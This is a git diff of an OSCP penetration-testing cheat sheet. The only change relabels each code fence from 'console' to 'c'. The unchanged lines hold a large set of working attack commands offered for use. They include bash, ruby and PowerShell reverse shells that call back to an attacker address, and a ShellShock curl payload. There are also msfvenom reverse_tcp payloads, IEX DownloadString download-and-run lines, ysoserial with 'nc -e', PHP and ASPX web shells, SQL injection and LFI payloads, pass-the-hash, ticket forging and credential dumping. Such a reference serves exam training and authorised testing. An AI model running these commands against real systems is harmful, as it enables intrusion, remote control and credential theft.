@@ -158,50 +158,50 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ## Commands
 ### Basics
 #### CentOS
-```console
+```c
 doas -u <user> /bin/sh
 ```
 #### Certutil
-```console
+```c
 certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
 ```
 #### Chisel
-```console
+```c
 ./chisel server -p 9002 -reverse -v
 ./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
 ```
 #### gcc
-```console
+```c
 gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
 i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 #### Netcat
-```console
+```c
 nc -lnvp <local_port> < <file>
 nc <remote_ip> <remote_port> > <file>
 ```
 #### PHP Webserver
-```console
+```c
 sudo php -S 127.0.0.1:80
 ```
 #### Ping
-```console
+```c
 ping -c 1 <remote_ip>
 ping -n 1 <remote_ip>
 ```
 #### Python Webserver
-```console
+```c
 sudo python -m SimpleHTTPServer 80
 sudo pyhton3 -m http.server 80
 ```
 #### RDP
-```console
+```c
 xfreerdp /v:<remote_ip> /u:<user> /p:<password> +clipboard
 rdesktop <remote_ip>
 ```
 #### SSH
-```console
+```c
 ssh user@<remote_ip> -oKexAlgorithms=+diffie-hellman-group1-sha1
 
 ssh -R 8080:<local_ip>:80 <remote_ip>
@@ -213,28 +213,28 @@ ssh -L 127.0.0.1:80:<local_ip>:80 <remote_ip>
 ssh -L 80:localhost:80 <remote_ip>
 ```
 #### tmux
-```console
+```c
 ctrl b + w    # show windows
 ctrl + "      # split window horizontal
 ctrl + %      # split window vertical
 ctrl + ,      # rename window
 ```
 Copy & Paste
-```console
+```c
 1. ctrl b + [
 2. space
 3. alt w
 4. ctrl b + ]
 ```
 Search
-```console
+```c
 ctrl b + [    # enter copy
 ctrl + /      # enter search while within copy mode for vi mode
 n             # search
 shift + n     # reverse search
 ```
 #### Upgrading Shells
-```console
+```c
 python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -246,18 +246,18 @@ Enter
 export XTERM=xterm
 ```
 #### vi
-```console
+```c
 :w !sudo tee %    # save file with evelated privileges without exiting
 ```
 #### Windows Command Formatting
-```console
+```c
 echo "<command>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
 ### Information Gathering
 #### DNS
 ##### Reverse DNS
-```console
+```c
 whois <domain>
 host <remote_ip> <remote_ip>
 host -l <domain> <remote_ip>
@@ -267,7 +267,7 @@ dig {a|txt|ns|mx} <domain> @ns1.<domain>
 dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
 ```
 #### ldapsearch
-```console
+```c
 ldapsearch -x -w <password>
 ldapsearch -x -h <remote_ip> -s base namingcontexts
 ldapsearch -x -b "dc=<target_domain>,dc=local" "*" -h <remote_ip> | awk '/dn: / {print $2}'
@@ -276,22 +276,22 @@ ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.a
 ldapsearch -x -h <remote_ip> -D "<user>"  -b "dc=<target_domain>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 #### SMB / NetBIOS
-```console
+```c
 nbtscan <remote_ip>
 enum4linux -a <remote_ip>
 ```
 
 ### Vulnerability Analysis
 #### finger
-```bash
+```c
 ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <remote_ip>
 ```
 #### Heartbleed
-```console
+```c
 sslyze --heartbleed <remote_ip>
 ```
 #### Nmap:
-```console
+```c
 sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <remote_ip>    # discovery scan
 sudo nmap -A -T4 -sC -sV --script vuln <remote_ip>    # vulnerability scan
 sudo nmap -sU <remote_ip>    # udp scan
@@ -301,13 +301,13 @@ ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
 #### Nuclei
-```console
+```c
 ./nuclei -target https://<target_url> -t nuclei-templates    # basic syntax with path to templates
 ./nuclei -target https://<target_url> -t nuclei-templates -rate-limit 5    # rate limiting
 ./nuclei -target https://<target_url> -t nuclei-templates -header 'User-Agent: Pentesting -H 'X-OSCP-EXAM: oscp_exam'    # set headers
 ```
 #### WPScan
-```console
+```c
 wpscan --url https://<remote_ip> --disable-tls-checks
 wpscan --url https://<remote_ip> --disable-tls-checks --enumerate u
 target=<remote_ip>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
@@ -316,11 +316,11 @@ wpscan --url http://<remote_ip> -U <user> -P passwords.txt -t 50
 
 ### Web Application Analysis
 #### Asset Discovery
-```console
+```c
 curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
 ```
 #### ffuf
-```console
+```c
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target_url>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
 
 ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<target_url>/ -H "Host: FUZZ.<target url>" -fs 185
@@ -330,7 +330,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http:
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target_url>/admin../admin_staging/index.php?page=FUZZ -fs 15349
 ```
 #### Gobuster
-```console
+```c
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<remote_ip>/
 
 gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip> -x php
@@ -342,23 +342,23 @@ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-li
 gobuster dns -d <target_domain> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 #### Hakrawler
-```console
+```c
 hakrawler -url <remote_ip> -depth 3
 hakrawler -url <remote_ip> -depth 3 -plain
 hakrawler -url <remote_ip> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
 ```
 #### Local File Inclusion Vulnerability
-```console
+```c
 http://<target_domain>/<file>.php?file=
 http://<target_domain>/<file>.php?file=../../../../../../../../etc/passwd
 http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd
 ```
 ##### Until php 5.3
-```console
+```c
 http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 ##### Encoded Traversal Strings
-```console
+```c
 ../
 ..\
 ..\/
@@ -371,12 +371,12 @@ http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd%
 ...\.\
 ```
 ##### Base64 Execution Bypass
-```console
+```c
 http://<remote_ip>/index.php?page=php://filter/convert.base64-encode/resource=index
 base64 -d <file>.php
 ```
 ##### Linux Files
-```console
+```c
 /etc/passwd
 /etc/shadow
 /etc/aliases
@@ -643,7 +643,7 @@ base64 -d <file>.php
 ~/.xsession
 ```
 ##### Windows Files
-```console
+```c
 C:/Users/Administrator/NTUser.dat
 C:/Documents and Settings/Administrator/NTUser.dat
 C:/apache/logs/access.log
@@ -714,7 +714,7 @@ C:/Windows/System32/inetsrv/config/applicationHost.config
 C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 ```
 #### wfuzz
-```console
+```c
 wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<remote_ip>:<remote_port>/FUZZ/<file>.php --hc '403,404'
 
 wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
@@ -730,7 +730,7 @@ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-1
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
 #### ysoserial
-```console
+```c
 java -jar ysoserial-master-SNAPSHOT.jar
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <local_ip> <local_port> -e /bin/sh' | base64 -w 0
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
@@ -739,7 +739,7 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
 
 ### Database Analysis
 #### Basic Commands:
-```console
+```c
 show databases;
 use <db>;
 show tables;
@@ -747,7 +747,7 @@ SELECT * FROM *;
 mysql -u <user> -h <host> -p
 ```
 #### SQLInjection
-```console
+```c
 ' or '1'='1
 admin' or '1'='1
 -'
@@ -783,7 +783,7 @@ or true--
 ")) or (("x"))=(("x
 ```
 #### sqlmap
-```console
+```c
 --batch         # don't ask any questions
 --current-db    # dumps database
 
@@ -801,15 +801,15 @@ sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0s
 sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
 ```
 #### sqsh
-```console
+```c
 sqsh -S <remote_ip> -U <user>
 ```
 #### SQL Truncation Attack
-```console
+```c
 'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
 ```
 #### xpath Injection
-```console
+```c
 test' or 1=1 or 'a'='a
 test' or 1=2 or 'a'='a
 'or substring(Password,1,1)='p' or'    # checking letter "p" on the beginning of the password
@@ -818,11 +818,11 @@ test' or 1=2 or 'a'='a
 
 ### Password Attacks
 #### fcrack
-```console
+```c
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip
 ```
 #### Hydra
-```console
+```c
 export HYDRA_PROXY=connect://127.0.0.1:8080
 unset HYDRA_PROXY
 
@@ -832,7 +832,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt <remote_ip> http-post-form "/
 ```
 
 #### John
-```console
+```c
 /usr/share/john/ssh2john.py id_rsa > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt <file>
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt <file>
@@ -842,7 +842,7 @@ john --show <file>
 ### Exploitation Tools
 #### Impacket
 ##### Basic Commands
-```console
+```c
 psexec.py <user>@<remote_ip>
 sudo impacket-smbserver local . -smb2support
 rpcdump.py <target_domain>/<user>:<password/hash>@<remote_ip>
@@ -851,29 +851,29 @@ lookupsid.py <target_domain>/<user>:<password/hash>@<remote_ip>
 reg.py <target_domain>/<user>:[password:password hash]@<remote_ip> <action> <action>
 ```
 ##### Database Connections
-```console
+```c
 mssqlclient.py <user>@<remote_ip>
 mssqlclient.py <user>@<remote_ip> -windows-auth
 ```
 ##### Forging Silver Ticket
-```console
+```c
 getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
 ```
 ##### ASPRepRoast
-```console
+```c
 GetNPUsers.py <target_domain>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 ```
 ##### PassTheHash
-```console
+```c
 getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 ##### SecretsDump
-```console
+```c
 secretsdump.py <domain>/<user>@<remote_ip>
 secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
 ```
 #### Web Shells
-```console
+```c
 /usr/share/webshells
 <?php echo shell_exe(($_GET['cmd']); ?>
 
@@ -907,15 +907,15 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 ```
 #### autologon
-```console
+```c
 powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <local_ip> <local_port>' -Credential $cred"
 ```
 #### Bash Privilege Escalation
-```console
+```c
 sudo -u#-1 /bin/bash
 ```
 #### Basic Linux Enumeration
-```console
+```c
 id
 sudo -l
 uname -a
@@ -928,18 +928,18 @@ ls -lahv
 ls -R /home
 ```
 #### Basic Windows Enumeration
-```console
+```c
 systeminfo
 whoami /all
 net users
 net users <user>
 ```
 #### Evil-WinRM
-```console
+```c
 sudo ruby /usr/local/bin/evil-winrm -i <remote_ip> -u <user> -p <password>
 ```
 #### find Commands
-```console
+```c
 find ./ -type f -exec grep --color=always -i -I 'password' {} \;
 
 find / -group <group> 2>/dev/null
@@ -954,17 +954,17 @@ find / -perm -4000 2>/dev/null | xargs ls -la
 find / -type f -user root -perm -4000 2>/dev/null
 ```
 #### grep for Passwords
-```console
+```c
 grep -R db_passwd
 grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
 ```
 #### JAWS
-```console
+```c
 IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
 ```
 #### Juicy Potato
-```console
+```c
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
 
 msf6 > use exploit/multi/handler
@@ -976,11 +976,11 @@ msf6 exploit(multi/handler) > run
 .\exploit.exe
 ```
 #### LaZagne
-```console
+```c
 laZagne.exe all
 ```
 #### nishang
-```console
+```c
 cd path/to/nishang/Shells/
 cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
 
@@ -992,7 +992,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>
 powershell "IEX(New-Object Net.Webclient).downloadString('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1')"
 ```
 #### Powershell & Powercat
-```console
+```c
 Set-ExecutionPolicy Unrestricted
 
 powershell -Command "$PSVersionTable.PSVersion"    # check powershell version
@@ -1012,23 +1012,23 @@ powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe
 echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
 ```
 #### ShellShock
-```console
+```c
 curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1' http://<remote_ip>/cgi-bin/user.sh
 ```
 #### Shikata Ga Nai
-```console
+```c
 msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
 ```
 #### Windows Tasks & Services
-```console
+```c
 tasklist /SVC
 netsh firewall show state
 schtasks /query /fo LIST /v
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 ```
-```console
+```c
 sc query
 sc qc <service-name>
 accesschk.exe -uws "Everyone" "C:\Program Files"
@@ -1039,12 +1039,12 @@ findstr /si password *.xml *.ini *.txt
 wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP pretty likely
 ```
 #### Writeable Directories in Linux
-```console
+```c
 /dev/shm
 /tmp
 ```
 #### Reverse Shells
-```console
+```c
 bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1
 bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 
@@ -1066,7 +1066,7 @@ ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("
 
 ### Templates
 #### ASPX Web Shell
-```console
+```c
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -1095,14 +1095,14 @@ Response.write(o)
 -->
 ```
 #### Bad YAML
-```console
+```c
 - hosts: localhost
   tasks:
     - name: badyml
       command: chmod +s /bin/bash
 ```
 #### Exploit Skeleton Python Script
-```console
+```c
 #!/usr/bin/python
 
 import socket,sys
@@ -1124,7 +1124,7 @@ finally:
 	s.close()
 ```
 #### JSON POST Request
-```console
+```c
 POST /<path> HTTP/1.1
 Host: <remote_ip>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
